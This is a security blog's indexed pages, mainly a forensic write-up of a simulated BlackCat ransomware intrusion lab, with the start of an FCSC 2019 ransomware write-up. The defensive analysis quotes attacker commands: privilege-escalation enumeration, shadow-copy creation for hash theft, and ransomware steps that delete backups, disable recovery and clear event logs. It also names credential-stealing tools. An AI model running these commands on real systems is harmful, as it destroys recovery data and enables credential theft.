[{"categories":[],"content":"Different CTF playlists","date":"2023-03-19","objectID":"/music/","series":null,"tags":["Techno","House","Emlectro"],"title":"Music","uri":"/music/"},{"categories":[],"content":" NT AUTHORITY\\System Playlist I use for working or while playing CTFs Read more... Breizh CTF 2023 Songs played during the BreizhCTF 2023. Playlist made with Zeecka :) Read more... Insomni'Hack 2022 All the songs that have been played during Insomni'Hack 2022 Read more... Insomni'Hack 2023 All the songs that have been played during Insomni'Hack 2023 Read more... ","date":"2023-03-19","objectID":"/music/:0:0","series":null,"tags":["Techno","House","Emlectro"],"title":"Music","uri":"/music/#"},{"categories":["projects"],"content":"Projects I had the opportunity to realise during my whole scholarship at IUT d'Aubi√®re (Network and Telecommunications) and at the ENSIBS.","date":"2022-01-25","objectID":"/projects/","series":null,"tags":["Projets","ENSIBS","AlgoSecure"],"title":"Projects","uri":"/projects/"},{"categories":["projects"],"content":" Info Projects I had the opportunity to realise during my whole scholarship at IUT d‚ÄôAubi√®re (Network and Telecommunications), at the ENSIBS and during my apprenticeship at AlgoSecure. ","date":"2022-01-25","objectID":"/projects/:0:0","series":null,"tags":["Projets","ENSIBS","AlgoSecure"],"title":"Projects","uri":"/projects/#"},{"categories":["projects"],"content":" Phish-U - Automated deployment of a phishing infrastructure(Feb. 2023 to Aug. 2023) As part of my final year project, I was asked to develop Phish-U, a tool to automate the deployment of phishing campaigns to support AlgoSecure consultants in their missions. ","date":"2022-01-25","objectID":"/projects/:0:1","series":null,"tags":["Projets","ENSIBS","AlgoSecure"],"title":"Projects","uri":"/projects/#phish-u---automated-deployment-of-a-phishing-infrastructure"},{"categories":["projects"],"content":" Breizh CTF 2023 - Challmaker(Dec. 2022 to Mar. 2023) I had the opportunity to create several OSINT challenges for the Breizh CTF 2023 in Rennes. I also helped other challmakers validate their challenges. ","date":"2022-01-25","objectID":"/projects/:0:2","series":null,"tags":["Projets","ENSIBS","AlgoSecure"],"title":"Projects","uri":"/projects/#breizh-ctf-2023---challmaker"},{"categories":["projects"],"content":" Cybersecurity, satellites and eavesdropping(Sep. 2022 to Feb. 2023) The project is a research project. At the end, the main objective is to help securing satellites communications. This project was divided in two main objectives : vulnerability research on protocols used in satellite communications setting up a satellite simulator to test our proof of concepts. Personally, I wanted to work on this project to discover the topic of cybersecurity applied into space in order to gain knowledge and to get out of my comfort zone. But also because space is a domain I find fascinating. ","date":"2022-01-25","objectID":"/projects/:0:3","series":null,"tags":["Projets","ENSIBS","AlgoSecure"],"title":"Projects","uri":"/projects/#cybersecurity-satellites-and-eavesdropping"},{"categories":["projects"],"content":" Car Hacking - Attacks and remediations(Sep. 2021 to Jun. 2022) The overall objective of this project was to evaluate the current safety of modern cars while raising awareness of the subject among car manufacturers and users. We have divided this project into 3 distinct parts: Studies, tests and automation of attacks on the unlocking system Studies and tests of attacks on the CAN Bus Studies and proposal of remediation solutions. ","date":"2022-01-25","objectID":"/projects/:0:4","series":null,"tags":["Projets","ENSIBS","AlgoSecure"],"title":"Projects","uri":"/projects/#car-hacking---attacks-and-remediations"},{"categories":["projects"],"content":" Creation and implementation of an IDS/IPS system in a Wi-Fi network(Nov. 2019 to Apr. 2020) The objective of this project was to create and implement our own system of detection (IDS) and protection (IPS) of attacks on Wi-Fi networks. ","date":"2022-01-25","objectID":"/projects/:0:5","series":null,"tags":["Projets","ENSIBS","AlgoSecure"],"title":"Projects","uri":"/projects/#creation-and-implementation-of-an-idsips-system-in-a-wi-fi-network"},{"categories":["whoami"],"content":"Short description of myself (:","date":"2022-01-25","objectID":"/whoami/","series":null,"tags":["whoami"],"title":"whoami?","uri":"/whoami/"},{"categories":["whoami"],"content":" ‚ùì IntroductionI am a former cyberdefense student at ENSIBS and currently working as Threat Hunter for WithSecure. My favorite infosec fields are OSINT, pentest, forensics and malware analysis. ","date":"2022-01-25","objectID":"/whoami/:0:1","series":null,"tags":["whoami"],"title":"whoami?","uri":"/whoami/#-introduction"},{"categories":["whoami"],"content":" üíª Infosec, or about 80% of my lifeBeing passionate about computer security, I practice during my free time various activities in the field. Currently, I‚Äôm heavily learning and practicing malware analysis as I‚Äôm now the happy owner of a Binary Ninja licence üòé. I‚Äôm one of the founder and a member of the MILF (Mother I‚Äôd Like to Flag) CTF Team, now sadly inactive. We used to participate in various CTFs throughout the year wether they are online or on-site. Now I just participate as a solo participant. So if you‚Äôre a member of an active CTF team looking for new members and reading that, feel free to hit me up! Apart from CTF, I like to practice on various infosec learning platforms such as TryHackMe, HackTheBox and more recently XINTRA Labs (in love ü•∞) and Hextree.io. I also participate in cybersecurity conferences and events in Europe whenever I can. ","date":"2022-01-25","objectID":"/whoami/:0:2","series":null,"tags":["whoami"],"title":"whoami?","uri":"/whoami/#-infosec-or-about-80-of-my-life"},{"categories":["whoami"],"content":" üèÖ Courses, books and certificationsThis is a non-exhaustive list of certifications and courses I have taken: OSCP (Offensive Security Certified Professional, by Offsec) Certified (certification here) PMRP (Practical Malware Research Professional, by TCM) Certified (certification here) Investigating Windows Endpoints by 13Cubed Certified (certification here) Investigating Windows Memory by 13Cubed Certified (certification here) IMBT (Introduction to Malware Binary Triage, Binary Ninja Edition, by Joshua Reynolds) Certified A (short) list of books I‚Äôve read and recommend: ‚ÄúPractical Malware Analysis‚Äù by Michael Sikorski and Andrew Honig Visual Threat Intelligence: An Illustrated Guide For Threat Researchers by Thomas Roccia. Objectives for 2025: Get the Zero2Automated certification by Vitali Kremez (@VK_Intel), Daniel Bunce (@0verfl0w_) and Jason Reaves (@sysopfb). - ON GOING ‚åõ Read ‚ÄúEvasive Malware, A Field Guide to Detecting, Analyzing, and Defeating Advanced Threats‚Äù by Kyle Cucci - Waiting for Santa üéÖüèª‚åõ Get a copy of Windows Internals, Begin MalDev Academy in order to increase my understanding of malwares, And two secret projects I‚Äôm currently working on‚Ä¶ :) ","date":"2022-01-25","objectID":"/whoami/:0:3","series":null,"tags":["whoami"],"title":"whoami?","uri":"/whoami/#-courses-books-and-certifications"},{"categories":["whoami"],"content":" ü™ü Life outside of infosec, the last 20%Outside of cybersecurity, I am also passionate about other things. I‚Äôm interested in motorsports as a whole. In fact, I often take part in rides or gatherings between fans of this discipline. I‚Äôll let you guess which model of motorbike I own‚Ä¶ If you can guess it, beer is on me! I‚Äôm also passionate about Japan. By the way, I had the opportunity to travel and work there for 2 months during summer 2022. Indeed, as part of the engineering degree, it is necessary to spend a minimum of 8 weeks abroad. Finally, space is a field in which I‚Äôve always been fascinated by. That said, I wasn‚Äôt that good in high school when it came to solving physics equations. :P ","date":"2022-01-25","objectID":"/whoami/:0:4","series":null,"tags":["whoami"],"title":"whoami?","uri":"/whoami/#-life-outside-of-infosec-the-last-20"},{"categories":["whoami"],"content":" ‚ú® Future plansI plan to pursue either in the field of digital forensics and incident response or in CTI (with a huuuuge focus on malware analysis and research). My goal, as big as it may be, is to drive science forward, and more specifically the field of cyberdefense by contributing to the community and improve IT security. ‚ÄúJust believe in yourself and you can become a hero.‚Äù ","date":"2022-01-25","objectID":"/whoami/:0:5","series":null,"tags":["whoami"],"title":"whoami?","uri":"/whoami/#-future-plans"},{"categories":["Article"],"content":" ContextWaifu University‚Äôs cyber team has called us after their IT teams reported a number of servers with files that aren‚Äôt opening and have a strange extension. On the scoping call, the victim also said they had identified a ransom note stating their data has been stolen. When asked about any earlier signs, the victim mentioned some strange, failed login activity early in March 2024 in their Entra ID, but wasn‚Äôt of concern at the time‚Ä¶ Ransomware will typically avoid system files to not cause crashes in the system, which also happens to be where a lot of forensic evidence is! We have been provided triage images of the hosts and log exports from the relevant systems. We are also given the network diagram of the infected part of the Waifu University network that the client is concerned with. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:1:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#context"},{"categories":["Article"],"content":" Chain of EventsThe attack on Waifu University by AlphV/BlackCat consisted of¬†four¬†main phases:¬†Phase 1: Initial Access and Foothold (03/03/2024). The threat actor initiated the attack by first compromising the Azure account of an internal employee through bruteforce and MFA push fatigue attacks, gaining access to the VPN and being able to breach into a jumpbox server in Waifu University‚Äôs network as a pivot point from which to launch the attack. Phase 2: Lateral Movement (03/03/2024). The threat actor used several privilege escalations techniques and the Cobalt Strike platform to move laterally between the victim‚Äôs¬†on-premises hosts and Azure environment through VPN and RDP connections. Phase 3: Data Exfiltration and Additional Lateral Movement (05/03/2024 - 07/03/2024). The threat actor managed to gain access to both the Domain Controller and the SQL server, allowing the exfiltration of a sensitive informations. Phase 4: Extortion Attempts (07/03/2024). The threat actor detonated their ransomware and probably threatened Waifu University to publish sensitive information if the ransom was not paid. They might have exaggerated about the volume and sensitivity of the stolen information. (this formatting of the chain of events was greatly inspired by Sygnia during their own analysis of the¬†anatomy¬†of¬†a¬†BlackCat¬†(ALPHV) attack which is awesome and worth checking :D) ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:2:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#chain-of-events"},{"categories":["Article"],"content":" Phase 1: Initial Access and Foothold (03/03/2024)","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:3:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#phase-1-initial-access-and-foothold-03032024"},{"categories":["Article"],"content":" 1.1. Scoping the incidentThis investigation started by having a look at the current state of the different machines in order to scope the incident. We quickly notice that every encrypted file has the extension .kh1ftzx appended to them. Moreover, we could also see the ransom note called RECOVER-kh1ftzx-FILES.txt in several directories. Inside this ransomware note, there‚Äôs a bunch of informations on what happened, what was supposedly stolen from Waifu University and the instructions on how to pay the ransom. For further communication, we‚Äôre left with the following TOR URL: rfosusl6qdm4zhoqbqnjxaloprld2qz35u77h4aap46rhwkouejsooqd.onion ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:3:1","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#11-scoping-the-incident"},{"categories":["Article"],"content":" 1.2. Initial access via EntraIDThere was several failed login attempts on the identity provider of Waifu‚Äôs university, which is Microsoft EntraID (the new name for Microsoft Azure Active Directory). This is something we can notice by filtering for the azure.activitylogs.result_type field with the value of 50126. This ‚Äúevent ID‚Äù is related to Azure AD sign-in logs which capture informations about user sign-in activities within the Azure AD environment. In this case, the description displayed shows some kind of bruteforce activity. As the we can see on the timeline, those failed login attempts started on the 3rd of March 2024 at around 11:01:11 AM and finished at 11:54:58 AM. By adding the field azure.activitylogs.identity_name as a column, we can see the number of unique users that were targeted by the login attempts. The Field statistics tab show that the attacker attempted to authenticate with a total of 8 users. In the event details, we have some interesting informations such as the user agent used by the threat actor. Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 We also notice from which IP the threat actor was conducting his attack. It appears he used a cloud provider (AWS) to proxy his requests. Although the information was available in the event details, it is not a bad idea to double check on VirusTotal. That said, the information held in this event was limited and it‚Äôs hard to see if the threat actor managed to succesfully login. What can be done is temporary disabling the azure.activitylogs.result_type filter while adding the field azure.activitylogs.identity_name equal to exists to remove noisy events that are not related to this activity. Also, something useful is adding the field azure.activitylogs.resultDescription as a column to quickly notice a different behavior As you may see, for the same number of user, we have a few more events. By looking at the distinct descriptions, one that caught my eye: Strong Authentication is required. For me, it meant the primary authentication was successful (username:password couple), but that additional authentication was required (such as MFA). Adding this value as a filter is a good idea to see for which user those events occured. The only user concerned was Ignazio Vanderplas. Furthermore, we can see more interesting informations in the event details related to the user and the authentication. For example, the userPrincipalName (UPN) is available. Here, the value for the user is ivanderplas1@waifu.phd. Also, it appears the \"authenticationMethod\": \"Password\" succeeded, demonstrating the threat actor successfully logged into the account but was locked by the MFA. But he still managed to authenticate, even if MFA was setup. Indeed, he used a technique called MFA push fatigue. A multi-factor authentication (MFA) fatigue attack ‚Äì also known as MFA Bombing or MFA Spamming ‚Äì is a social engineering cyberattack strategy where attackers repeatedly push second-factor authentication requests to the target victim‚Äôs email, phone, or registered devices. The goal is to coerce the victim into confirming their identity via notification, thus authenticating the attackers attempt at entering their account or device. Source: BeyondTrust To find this information, increasing the timespan by 2 hours and filtering with the azure.activitylogs.identity_name of Ignazio Vanderplas is a great way. Then, same method as before, by looking at the distinct resultDescription messages to see if there was any interesting one. One was more present than the others: The message Authentication failed during strong authentication request is way more present than the others for this particular user. Having a look at the event details: It shows the MFA was denied by the user, meaning that each of this event sent a MFA push notification to the user. In total, he received atleast 29 of them, and in a very short timespan, matching the definition of the M","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:3:2","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#12-initial-access-via-entraid"},{"categories":["Article"],"content":" 1.3. Breaching the universityAfter knowing the threat actor successfully managed to connect to the VPN through the account ivanderplas1@waifu.phd, the next step was to find the breached host, which is the hostname the attacker was able to first access once in the network. Since the threat actor logged into OpenVPN, it is interesting to look for logins from the DMZ. Here are the filters that can be used to find the information: Windows Event Log ID 4624 corresponding to An account was succesfully logged on, the username of the breached account Ignazio Vanderplaswith the filter winlog.event_data.TargetUserName equal to ivanderplas1, the CC-VDG-01 host‚Äôs IP address (10.0.0.12) which is the Virtual Desktop Gateway. We can notice the first successfull connection was made at 13:37:32 PM the 3rd of March 2024 on the host called CC-JMP-01 corresponding to the jumpbox host. Another interesting information is the field winlog.event_data.WorkstationName which is related to the hostname of the threat actor‚Äôs device used to get into the network. After knowing the attacker accessed the CC-JMP-01 host, we investigated its dump. An interesting thing to look out for is the browser history which is located in C:\\Users\\ivanderplas1\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History We can see he searched for what is my ip. anf that‚Äôs pretty much it. But another interesting thing to look out for is which commands has been executed by the attacker. It‚Äôs worth investigating the Powershell command line history file located at C\\Users\\ivanderplas1\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline The attacker downloaded SharpHound.exe as s.exe on the host directly from Github, in the following repo: https://github.com/Flangvik/SharpCollection and executed it with the command .\\s.exe. Surely, this allowed him to enumerate the network in order to find privilege escalation and lateral movements vectors. Additionally, we can see that in Windows Event with an event.codeof 22 corresponding to DNS query. Here‚Äôs the proof that a Powershell process has been spawned to make a DNS query to github.com at 17:09:24 PM on the same day. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:3:3","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#13-breaching-the-university"},{"categories":["Article"],"content":" 1.4. Privilege EscalationAfter thorough analysis, we were able to identify the threat actor was querying service information on the beachhead host about an hour after the previous event. Shortly after they seemed to have administrator access. At 17:53:50 PM, the attacker executed several commands for enumeration purposes in order to find a privilege escalation vector. wmic service get name,displayname,pathname,startmode findstr /i \"auto\" findstr /i /v \"c:\\windows\\\\\" findstr /i /v \"\"\" Those commands are used to find Unquoted Service Paths. On the MITRE ATT\u0026CK website, we can find it is corresponding to the sub-technique ‚ÄúT1574.009 - Path Interception by Unquoted Path‚Äù which is commonly used for privilege escalation. By doing some research, we can find the exact same commands in this pentest cheatsheet on Github. A few minutes after, at 18:15:18 PM, the attacker created a file called waifu.exe (SHA1: dc202a87712c20412ab292fb0b868cff97b68db3 ). Then, one minute later at 18:16:21 PM, the threat actor started the service Waifu Service. The Waifu Service is directly linked to the waifu.exe binary created previously. Searching for the hash of the binary had no results on VirusTotal. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:3:4","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#14-privilege-escalation"},{"categories":["Article"],"content":" Phase 2: Lateral Movement (03/03/2024)","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:4:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#phase-2-lateral-movement-03032024"},{"categories":["Article"],"content":" 2.1. Remote AccessOnce the threat actor managed to escalate his privileges as NT AUTHORITY\\SYSTEM, he installed ScreenConnect at 18:21:26 PM. We can see that by keeping the same timeline and filtering with winlog.event_data.User equal to NT AUTHORITY\\SYSTEM. When we take a closer look at the command that has been executed, we can see that ScreenConnect will communicate with the host instance-i77ws2-relay.screenconnect.com The threat actor then ran an interesting payload. He replaced the legitimate C\\Program Files\\Python312\\python.exe with some kind of malware with the help of the ScreenConnect File Manager. As far as we know from the events we have, the binary was still legitimate on the 4th of March 2024 at 13:09:17 PM. The next day, 5th of March 2024 at 23:25:24 PM, the malicious python.exe was there. We confirmed that with the hash of python.exe that changed. Sadly, the sysmon event logs didn‚Äôt record any network activity due to the limitation of the configuration setup by Waifu University. Still, we managed to get the process dump from them for further analysis. By looking at the process dump, we find it was a Cobalt Strike beacon. By using the tool Cobalt Strike Configuration Extractor and Parser, we manage to extract the IP the beacon talks to. As you can see on the above, the hostname IP address is 207.246.70.192. Another interesting information we retrieve is the domain in the host_header which is screenconnect.dev. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:4:1","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#21-remote-access"},{"categories":["Article"],"content":" Phase 3: Data Exfiltration and Additional Lateral Movement (05/03/2024 - 07/03/2024)","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:5:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#phase-3-data-exfiltration-and-additional-lateral-movement-05032024---07032024"},{"categories":["Article"],"content":" 3.1. Accessing Volume Shadow CopiesIn the meantime, the threat actor managed to access a volume shadow copy of the beachhead host. Indeed, at 21:23:17 PM on the 5th of March, they ran the command vssadmin create shadow /for=C: to create a new volume shadow copy of the C drive of CC-JMP-01. They did this in order to pull local password hashes. There are a few ways to dump Active Directory and local password hashes. Until recently, the techniques I had seen used to get the hashes either relied on injecting code in to LSASS or using the Volume Shadow Copy service to obtain copies of the files which contain the hashes. Source : SpiderLabs Blog We can also notice the file 663bc8c1-f975-4a03-ad75-02145ad1b7c4run.cmd which was responsible for running the volume shadow copy command. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:5:1","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#31-accessing-volume-shadow-copies"},{"categories":["Article"],"content":" 3.2. Looking around the networkA few minutes later at 21:39:40 PM, the threat actor managed to open a file that was supposed to be in a hidden share from the beachhead host. We managed to saw that by filtering for event.code equal to 5140 corresponding to A network share object was accessed. Then checking unique distinct entries, we noticed the following share: SuperSecretSecureShare. At this point, we then just filtered for winlog.event_Data.ShareName equal to \\\\*\\SuperSecretSecureShare and added the field winlog.event_data.RelativeTargetName as a column to find any file accessed. The attacker first accessed the file you-cant-see-this-cause-I-am-good-at-NTFS-permissions.txt, still at 21:39:40 PM. This information could also be found in the output CSV file of the LECmd tool from Eric Zimmerman which is a LNK Explorer. Back to the Cobalt Strike beacon, we wanted to take a closer look at what has been initiated by it. To do so, a good option was to make an OR syntax filtering for C:\\Prgram Files\\Python321\\python.exe as a ProcessName or as an Image from the creation of the beacon. There was around 15 events found with this method. At 02:05:13 AM on the 6th of March 2024, the threat actor enumerated the Builtin\\Administrators group. Then, they managed to create the file SharpHound.exe at 02:18:41 AM. The same information could be found in the parsed $MFT with a little bit more of efforts. That said, they didn‚Äôt manage to execute this tool. Indeed, after filtering for event.code equal to 4688 to find created processes, there was no result for the SharpHound.exebinary. As there was no evidence of execution, we can assume the threat actor didn‚Äôt execute the tool succesfully. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:5:2","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#32-looking-around-the-network"},{"categories":["Article"],"content":" 3.3. Domain dominanceA few minutes later at 02:13:16 AM on the 6th of March 2024, the threat actor attempted to install a service called 8628f7b on the Domain Controller, linked to the 8628f7b.exe binary. Then at 02:22:02 AM and 02:22:51 AM, the attacker logged in with the account CC-Admin on the Domain Controller CC-DC-01. An interesting information we could find investigating those logs was the operating system distribution the threat actor is using: Parrot, a famous OS for security professionnals like Kali Linux. The information was found in 2 different events IDs : 4776 -\u003e The computer attempted to validate the credentials for an account 4624 -\u003e An account was successfully logged on. Around 30 minutes later at02:53:15 AM, the user CC-Admin ran the InjectDLL.exe binary from the AADInternals toolkit in order to inject the dll PTASpy.dllinto a process with a PID of 3616. Having the PID of the process injected into, we pivoted with that information to see which process had this PID before the injection. Something worth noting is we had to also filter for the hexadecimal equivalent of the PID (3616 in base 10 is equal to 0xe20 in base 16). It appeared the file name of that process was AzureADConnectAuthenticationAgentService.exe And it makes sense because while investigating for PTASpy, I stumbled across the PTASpy.ps1script on Github. By looking at it, we quickly noticed that PTASpy collects credentials and needs to be run on a computer with Azure AD Authentication Agent running, hence why it was injected in this process. Looking at the users present on CC-DC-01, we can assume that the credentials of the user cpecht7 could have get their credentials stolen by the DLL. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:5:3","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#33-domain-dominance"},{"categories":["Article"],"content":" 3.4 Accessing the good stuffLooking at the RDP connections that succeeded through the event code 1149, we noticed the threat actor moved on the SQL serverCC-SQL-01 at 02:59:30 AM on the 6th of March 2024 with the user cc-admin. We had the information that the University admins noticed a strange file in the documents folder of the admin user for the SQL server which was created during the intrusion. So we started by searching for a suspicious file in the Documents folder of the CC-Admin user in the parsed $MFT CSV file and noticed a file called database.bak.rpt.kh1ftzx. To see the earliest MFT Entry of this file and track any change made to it, we then used the USNJrnl. So, we opened $J (a parse file) and noticed its first MFT Entry ID was at 03:09:24 AM on the 7th of March 2023. Also, it‚Äôs worth mentioning that .rpt is one of the export types you can choose from Microsoft SQL Server. We can assume the threat actor probably exfiltrated the data from the SQL server before releasing the ransomware. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:5:4","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#34-accessing-the-good-stuff"},{"categories":["Article"],"content":" Phase 4: Extortion Attempts (07/03/2024)","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:6:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#phase-4-extortion-attempts-07032024"},{"categories":["Article"],"content":" 4.1 Release the ransomware UwUFinally, at 03:33:36 AM on the 7th of March 2024, we observed the execution of the ransomware named print64.exe. First, print64.bat get executed and will run the malware with the access token as an argument. Then, a bunch of commands got executed and files were encrypted. You‚Äôll find below the command executed and their description, also reported by Microsoft Command Description wmic csproduct get UUID Gets the Universally Unique Identifier (UUID) of the target device wmic.exe Shadowcopy Delete Deletes shadow copies fsutil behavior set SymlinkEvaluation R2L:1 Allows remote-to-local symbolic links; a symbolic link is a file-system object (for example, a file or folder) that points to another file system object, like a shortcut in many ways but more powerful fsutil behavior set SymlinkEvaluation R2R:1 Allows remote-to-remote symbolic links iisreset.exe /stop Stops running services to allow encryption of data reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters /v MaxMpxCt /d 65536 /t REG_DWORD /f Modifies the registry to change MaxMpxCt settings; BlackCat does this to increase the number of outstanding requests allowed (for example, SMB requests when distributing ransomware via its PsExec methodology) vssadmin.exe Delete Shadows /all /quiet Deletes backups to prevent recovery arp -a View the ARP table bcdedit /set {default} Disabling Automatic Repair bcdedit /set {default} recoveryenabled No Disabling Automatic Repair cmd.exe /c for /F \\\"tokens=*\\\" %1 in ('wevutil.exe el') DO wevutil.exe cl \\%1\\ Clears event logs This final analysis conclude the investigation on AlphV/BlackCat ransomware group breach on Waifu University. For a deep dive into the analysis of the ransomware, you can check this research article. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:6:1","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#41-release-the-ransomware-uwu"},{"categories":["Article"],"content":" (ÔºûœâÔºú) ‚ô° Conclusion ‚ô° (ÔºûœâÔºú)This APT emulation lab was the first one I had the opportunity to take on the platform and the first thing I can tell is that I was really surprised by the realism of the scenario. It actually covers real analysis and will definitely teach you skills that will be useful in your daily job. After going through the lab, it almost feels like a senior threat hunter just taught me what he learnt and how we managed to investigate an AlphV/BlackCat incident response case. ü§ì I can tell a LOOOT of work was put into the creation of such a lab. I can only recommend it to anybody who is interested to the world of threat hunting or DFIR in general. It will be a great experience to actually practice on a real case scenario. And honestly, it‚Äôs really really cheap for the amount of education you will get. Kudos to Xintra for making it this affordable, especially in this industry where most of the educational content (especially for infosec certification) prices are getting higher and higher. Big thanks to the team at Xintra \u0026 to the lab contributors ‚ù§Ô∏è : @ippsec for the adversary emulation, @DebugPrivilege for the lab design, @svch0st - Incident responder, @InverseCos - Founder of Xintra. If you have any feedback on my analysis, my methodology and my approach to this lab, please feel free to contact me Discord (@hashp4) or Twitter (@hashp4_). I would be happy to know how I could have done it differently / more efficiently! :) (Yes, I took some hints :P) ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:7:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#œâ--conclusion--œâ"},{"categories":["Article"],"content":" Summary attack diagramAs a summary (and for fun), I made a diagram of what happened during the attack perpetrated by AlphV/BlackCat on Waifu University. I hope it may help you understand better the major events of this incident. ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:8:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#summary-attack-diagram"},{"categories":["Article"],"content":" ResourcesHere are the interesting resources I found during the resolution of this lab. Azure Event Log IDs bruteforce - Rezonate Blackcat Ransomware article- Microsoft Malware analysis of the Blackcat ransomware - SecurityScoreCard Pentest Cheatsheet for VSSAdmin - Github SSH IP Fingerpint - SuperUser UsnJournal explanation - Forensafe Volume Shadow Copy explanation - ADSecurity ","date":"2024-05-12","objectID":"/xintra-lab-waifu-university/:9:0","series":null,"tags":["APT","AlphV/BlackCat","Ransomware","DFIR","Threat Hunting","Xintra","Lab"],"title":"Xintra APT Emulation Lab - Waifu University ‚ô° (ÔºûœâÔºú)","uri":"/xintra-lab-waifu-university/#resources"},{"categories":["Writeup"],"content":"Solution to the **last** challenge in the `3615 Incident` series published at FCSC 2019.","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/"},{"categories":["Writeup"],"content":" Introduction üìåThe context remains the same as in Part 1 and Part 2. Yet another victim has fallen victim to ransomware. Payment of the ransom is not an option, given the amount involved. So we‚Äôre called in to try and restore the encrypted files. This time, the objective is to decrypt the attached data file. (The challenge is always solved using the mem.dmp.tar.xz file. As a reminder, this is a memory image of the victim‚Äôs computer. In concrete terms, it corresponds to the contents of volatile memory (RAM) at the time of acquisition. We also have the data file to decrypt.) ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:1:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#introduction-pushpin"},{"categories":["Writeup"],"content":" 1. Study of the 